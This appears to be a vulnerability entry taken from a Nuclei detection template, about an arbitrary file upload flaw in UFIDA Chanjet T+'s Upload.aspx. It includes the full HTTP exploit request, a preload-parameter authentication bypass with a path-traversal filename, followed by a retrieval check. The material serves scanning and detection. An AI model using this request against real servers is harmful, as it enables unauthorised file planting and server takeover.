# Vulnerability: UFIDA Chanjet TPluse Upload.aspx - Arbitrary File Upload
**Classification:** YONYOU
**Source:** Nuclei Template (`chanjet-tplus-fileupload.yaml`)

## Description
There is an arbitrary file upload vulnerability in the Upload.aspx interface of UFIDA Chanjet TPlus. An attacker can use the preload parameter to bypass authentication to upload files and control the server.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuirnbcvo
Accept-Encoding: gzip

------WebKitFormBoundaryuirnbcvo
Content-Disposition: form-data; name="File1"; filename="../../../img/login/{{randstr_1}}.jpg"
Content-Type: image/jpeg

{{randstr_2}}
------WebKitFormBoundaryuirnbcvo--

GET /tplus/img/login/{{randstr_1}}.jpg HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip
```

